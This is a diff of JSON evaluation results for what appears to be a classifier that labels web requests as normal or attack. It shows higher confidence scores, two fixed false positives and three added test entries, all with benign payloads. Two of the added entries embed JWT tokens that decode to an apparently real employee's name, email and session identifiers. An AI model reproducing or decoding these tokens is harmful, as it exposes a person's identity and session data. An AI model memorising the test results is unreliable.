     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.818,
+    "confidence": 0.9324,
     "correct": true
   },
   {
@@ -1060,7 +1060,7 @@
     "payload": "POST /api/v1/logs/frontend (traceback)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8539,
+    "confidence": 0.9854,
     "correct": true
   },
   {
@@ -1068,7 +1068,7 @@
     "payload": "GET /user/profile",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7557,
+    "confidence": 0.9745,
     "correct": true
   },
   {
@@ -1076,7 +1076,7 @@
     "payload": "GET /dashboard?view=summary&time=30d",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7626,
+    "confidence": 0.9445,
     "correct": true
   },
   {
@@ -1084,7 +1084,7 @@
     "payload": "GET /settings/security",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7471,
+    "confidence": 0.9803,
     "correct": true
   },
   {
@@ -1092,7 +1092,7 @@
     "payload": "POST /auth/password-reset-request",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8638,
+    "confidence": 0.9398,
     "correct": true
   },
   {
@@ -1100,7 +1100,7 @@
     "payload": "POST /newsletter/subscribe",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6676,
+    "confidence": 0.9721,
     "correct": true
   },
   {
@@ -1108,7 +1108,7 @@
     "payload": "POST /cart/add?product_id=99",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7528,
+    "confidence": 0.9518,
     "correct": true
   },
   {
@@ -1116,7 +1116,7 @@
     "payload": "GET /checkout/step1",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7352,
+    "confidence": 0.9576,
     "correct": true
   },
   {
@@ -1124,7 +1124,7 @@
     "payload": "GET /checkout/success?order_id=ord_123",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8402,
+    "confidence": 0.9619,
     "correct": true
   },
   {
@@ -1132,7 +1132,7 @@
     "payload": "POST /webhooks/github (Push Event)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7505,
+    "confidence": 0.9589,
     "correct": true
   },
   {
@@ -1140,7 +1140,7 @@
     "payload": "POST /webhooks/stripe (Payment Success)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8209,
+    "confidence": 0.9524,
     "correct": true
   },
   {
@@ -1148,7 +1148,7 @@
     "payload": "HEAD /assets/large-video.mp4",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6428,
+    "confidence": 0.9538,
     "correct": true
   },
   {
@@ -1156,7 +1156,7 @@
     "payload": "OPTIONS /api/v1/data",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8156,
+    "confidence": 0.9916,
     "correct": true
   },
   {
@@ -1164,7 +1164,7 @@
     "payload": "GET /fonts/inter-bold.woff2",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7026,
+    "confidence": 0.961,
     "correct": true
   },
   {
@@ -1172,7 +1172,7 @@
     "payload": "GET /manifest.json",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6201,
+    "confidence": 0.9422,
     "correct": true
   },
   {
@@ -1180,7 +1180,7 @@
     "payload": "GET /locales/vi-VN.json",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6638,
+    "confidence": 0.9561,
     "correct": true
   },
   {
@@ -1188,7 +1188,7 @@
     "payload": "POST /graphql (query { me { name } })",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7614,
+    "confidence": 0.8294,
     "correct": true
   },
   {
@@ -1196,7 +1196,7 @@
     "payload": "GET /docs/api/introduction",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7926,
+    "confidence": 0.9927,
     "correct": true
   },
   {
@@ -1204,7 +1204,7 @@
     "payload": "GET /blog/future-of-ai-2026",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6635,
+    "confidence": 0.9406,
     "correct": true
   },
   {
@@ -1212,7 +1212,7 @@
     "payload": "POST /blog/comment (valid user text)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.5993,
+    "confidence": 0.9484,
     "correct": true
   },
   {
@@ -1220,7 +1220,7 @@
     "payload": "GET /stream/hls/chunk_001.ts",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.569,
+    "confidence": 0.9476,
     "correct": true
   },
   {
@@ -1228,7 +1228,7 @@
     "payload": "GET /maps/v2/tile/10/512/324.png",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.759,
+    "confidence": 0.935,
     "correct": true
   },
   {
@@ -1236,7 +1236,7 @@
     "payload": "GET /admin/dashboard/users/active",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8494,
+    "confidence": 0.9758,
     "correct": true
   },
   {
@@ -1244,7 +1244,7 @@
     "payload": "GET /downloads/guide-v2.pdf",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.723,
+    "confidence": 0.9415,
     "correct": true
   },
   {
@@ -1252,7 +1252,7 @@
     "payload": "POST /auth/mfa/verify {\"code\": \"123456\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8379,
+    "confidence": 0.9678,
     "correct": true
   },
   {
@@ -1260,7 +1260,7 @@
     "payload": "POST /api/v1/user/avatar (multipart/form-data)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8741,
+    "confidence": 0.9846,
     "correct": true
   },
   {
@@ -1268,7 +1268,7 @@
     "payload": "POST /api/v1/documents (binary stream)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8689,
+    "confidence": 0.9893,
     "correct": true
   },
   {
@@ -1276,7 +1276,7 @@
     "payload": "GET /api/v1/search/suggest?q=secur",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.851,
+    "confidence": 0.9953,
     "correct": true
   },
   {
@@ -1284,7 +1284,7 @@
     "payload": "GET /products?category=electronics&brand=apple",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8435,
+    "confidence": 0.9931,
     "correct": true
   },
   {
@@ -1292,7 +1292,7 @@
     "payload": "GET /products?sort=price_desc&page=1",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8474,
+    "confidence": 0.9509,
     "correct": true
   },
   {
@@ -1300,7 +1300,7 @@
     "payload": "POST /api/v1/posts/55/comments {\"text\": \"Great article!\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.874,
+    "confidence": 0.9878,
     "correct": true
   },
   {
@@ -1308,7 +1308,7 @@
     "payload": "PUT /api/v1/user/settings {\"avatar_url\": \"https://img.com/u1.png\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8951,
+    "confidence": 0.9593,
     "correct": true
   },
   {
@@ -1316,7 +1316,7 @@
     "payload": "GET /admin/users?limit=20&offset=40",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8249,
+    "confidence": 0.9918,
     "correct": true
   },
   {
@@ -1324,7 +1324,7 @@
     "payload": "GET /admin/reports/sales.csv?year=2025",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7922,
+    "confidence": 0.9327,
     "correct": true
   },
   {
@@ -1332,7 +1332,7 @@
     "payload": "POST /user/password-update {\"old\": \"pass1\", \"new\": \"pass2\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8647,
+    "confidence": 0.9932,
     "correct": true
   },
   {
@@ -1340,7 +1340,7 @@
     "payload": "GET /user/mfa/setup-qr",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7946,
+    "confidence": 0.9616,
     "correct": true
   },
   {
@@ -1348,7 +1348,7 @@
     "payload": "GET /newsletter/unsubscribe?token=abc123def456",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7743,
+    "confidence": 0.9509,
     "correct": true
   },
   {
@@ -1356,7 +1356,7 @@
     "payload": "GET /auth/verify-email?code=v987654321",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7724,
+    "confidence": 0.9601,
     "correct": true
   },
   {
@@ -1364,23 +1364,23 @@
     "payload": "POST /team/invite {\"email\": \"colleague@work.com\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7203,
+    "confidence": 0.9601,
     "correct": true
   },
   {
     "category": "Project Creation (JSON naming)",
     "payload": "POST /api/v1/projects {\"name\": \"Security Audit 2026\"}",
     "expected": "NORMAL",
-    "predicted": "ATTACK",
-    "confidence": 0.527,
-    "correct": false
+    "predicted": "NORMAL",
+    "confidence": 0.9712,
+    "correct": true
   },
   {
     "category": "Billing Address Update",
     "payload": "PUT /billing/address {\"street\": \"123 Main St\", \"city\": \"Hanoi\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7843,
+    "confidence": 0.959,
     "correct": true
   },
   {
@@ -1388,7 +1388,7 @@
     "payload": "POST /api/v1/payment/tokens {\"card_last4\": \"4242\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8645,
+    "confidence": 0.9733,
     "correct": true
   },
   {
@@ -1396,7 +1396,7 @@
     "payload": "GET /user/orders?status=shipped&from=2025-01-01",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6454,
+    "confidence": 0.9288,
     "correct": true
   },
   {
@@ -1404,7 +1404,7 @@
     "payload": "GET /help/kb/search?query=how+to+reset+password",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8561,
+    "confidence": 0.9562,
     "correct": true
   },
   {
@@ -1412,7 +1412,7 @@
     "payload": "POST /logs/client {\"error\": \"Uncaught TypeError\", \"stack\": \"...\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8203,
+    "confidence": 0.99,
     "correct": true
   },
   {
@@ -1420,7 +1420,7 @@
     "payload": "POST /analytics/metric {\"event\": \"button_click\", \"label\": \"signup\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6924,
+    "confidence": 0.9519,
     "correct": true
   },
   {
@@ -1428,7 +1428,7 @@
     "payload": "GET /ws/notifications (Upgrade: websocket)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.783,
+    "confidence": 0.9566,
     "correct": true
   },
   {
@@ -1436,7 +1436,7 @@
     "payload": "[Binary Frame] 0x89 (Ping)",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.736,
+    "confidence": 0.9238,
     "correct": true
   },
   {
@@ -1444,7 +1444,7 @@
     "payload": "GET /static/icons/heart.svg",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.764,
+    "confidence": 0.9751,
     "correct": true
   },
   {
@@ -1452,7 +1452,7 @@
     "payload": "GET /images/hero-banner.webp",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7957,
+    "confidence": 0.9506,
     "correct": true
   },
   {
@@ -1460,7 +1460,7 @@
     "payload": "GET /config/app-settings.json",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.773,
+    "confidence": 0.9667,
     "correct": true
   },
   {
@@ -1468,7 +1468,7 @@
     "payload": "GET /api/v1/locale/set?lang=en",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8509,
+    "confidence": 0.9868,
     "correct": true
   },
   {
@@ -1476,7 +1476,7 @@
     "payload": "POST /user/ui/theme {\"mode\": \"dark\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6743,
+    "confidence": 0.9419,
     "correct": true
   },
   {
@@ -1484,7 +1484,7 @@
     "payload": "DELETE /api/v1/notifications/1024",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8259,
+    "confidence": 0.9963,
     "correct": true
   },
   {
@@ -1492,7 +1492,7 @@
     "payload": "PATCH /api/v1/messages/500 {\"read\": true}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8573,
+    "confidence": 0.9752,
     "correct": true
   },
   {
@@ -1500,7 +1500,7 @@
     "payload": "POST /api/v1/sync/video {\"id\": \"v_123\", \"position\": 450}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.852,
+    "confidence": 0.9795,
     "correct": true
   },
   {
@@ -1508,7 +1508,7 @@
     "payload": "GET /stream/audio/segment_77.aac",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7056,
+    "confidence": 0.9583,
     "correct": true
   },
   {
@@ -1516,7 +1516,7 @@
     "payload": "GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8318,
+    "confidence": 0.9545,
     "correct": true
   },
   {
@@ -1524,7 +1524,7 @@
     "payload": "GET /api/v1/dashboard/widgets/sales-chart/data",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8747,
+    "confidence": 0.9887,
     "correct": true
   },
   {
@@ -1532,7 +1532,7 @@
     "payload": "GET /api/v1/tasks/rep_99/status",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8295,
+    "confidence": 0.9907,
     "correct": true
   },
   {
@@ -1540,7 +1540,7 @@
     "payload": "POST /legal/tos/accept {\"version\": \"2.1.0\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6976,
+    "confidence": 0.8992,
     "correct": true
   },
   {
@@ -1548,7 +1548,7 @@
     "payload": "POST /privacy/consent {\"analytics\": true, \"marketing\": false}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7982,
+    "confidence": 0.946,
     "correct": true
   },
   {
@@ -1556,23 +1556,23 @@
     "payload": "GET /search?q=machine+learning+NOT+python",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8078,
+    "confidence": 0.97,
     "correct": true
   },
   {
     "category": "Product Review Submit (Text + Star rating)",
     "payload": "POST /reviews {\"id\": \"p_50\", \"stars\": 5, \"comment\": \"Amazing quality!\"}",
     "expected": "NORMAL",
-    "predicted": "ATTACK",
-    "confidence": 0.6739,
-    "correct": false
+    "predicted": "NORMAL",
+    "confidence": 0.953,
+    "correct": true
   },
   {
     "category": "Wishlist Add Request",
     "payload": "POST /wishlist/add {\"item_id\": \"it_888\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7589,
+    "confidence": 0.9435,
     "correct": true
   },
   {
@@ -1580,7 +1580,7 @@
     "payload": "GET /products/compare?base=p1&target=p2",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.885,
+    "confidence": 0.9491,
     "correct": true
   },
   {
@@ -1588,7 +1588,7 @@
     "payload": "GET /stores/find?zip=10001&distance=10",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7482,
+    "confidence": 0.9326,
     "correct": true
   },
   {
@@ -1596,7 +1596,7 @@
     "payload": "POST /careers/apply {\"job_id\": \"eng_01\", \"name\": \"John Doe\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7934,
+    "confidence": 0.9603,
     "correct": true
   },
   {
@@ -1604,7 +1604,7 @@
     "payload": "GET /api/v1/support/tickets/404/attachments",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8278,
+    "confidence": 0.9874,
     "correct": true
   },
   {
@@ -1612,7 +1612,7 @@
     "payload": "POST /chat/init {\"user_id\": \"u_55\", \"topic\": \"billing\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7747,
+    "confidence": 0.9647,
     "correct": true
   },
   {
@@ -1620,7 +1620,7 @@
     "payload": "GET /feed/news.rss",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6788,
+    "confidence": 0.9604,
     "correct": true
   },
   {
@@ -1628,7 +1628,7 @@
     "payload": "GET /podcasts/latest.xml",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6371,
+    "confidence": 0.9487,
     "correct": true
   },
   {
@@ -1636,7 +1636,7 @@
     "payload": "POST /api/v1/deliver/kindle {\"book_id\": \"b_772\"}",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.8459,
+    "confidence": 0.9798,
     "correct": true
   },
   {
@@ -1644,7 +1644,7 @@
     "payload": "GET /auth/logout/confirm",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.7802,
+    "confidence": 0.9713,
     "correct": true
   },
   {
@@ -1652,7 +1652,31 @@
     "payload": "GET /homess",
     "expected": "NORMAL",
     "predicted": "NORMAL",
-    "confidence": 0.6702,
+    "confidence": 0.9637,
+    "correct": true
+  },
+  {
+    "category": "Test2",
+    "payload": "GET /id?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIzNTEwMzcsImlhdCI6MTc3MjA5MTgzNywidXNlciI6eyJzZXNzaW9uX2lkIjoiMDE5Yzk4ZTctOGFjMi03Mjc0LWFkM2EtMmRiNzFhZTYzZThlIiwic291cmNlIjoiQk8iLCJzdGFmZl9jb2RlIjoibGluaGxoMiIsInVzZXJfZW1haWwiOiJsaW5obGgyQHZucGF5LnZuIiwidXNlcl9mdWxsX25hbWUiOiJMaW5oIEzDqiBIw",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.9929,
+    "correct": true
+  },
+  {
+    "category": "Test3",
+    "payload": "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIxODE2MDMsImlhdCI6MTc3MTkyMjQwMywidXNlciI6eyJncm91cF9pZCI6IjAxOWMwZTZlLWI0YTctNzRjYS05MGNlLTUyY2M0Njg5MzZjZSIsImxlYWRlcl9pZCI6IjAxOWMwOWU0LTNmY2QtNzc2ZS05ZGUwLWFiZGYyZjI3ZTYwMyIsInNlc3Npb25faWQiOiIwMTljOGVjZS0zMTkyLTc4MjQtYTI1OS0zZDZmM2JhM2NkM",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.9933,
+    "correct": true
+  },
+  {
+    "category": "Only slash",
+    "payload": "GET /ducbph {UA: curl}",
+    "expected": "NORMAL",
+    "predicted": "NORMAL",
+    "confidence": 0.9422,
     "correct": true
   }
 ]
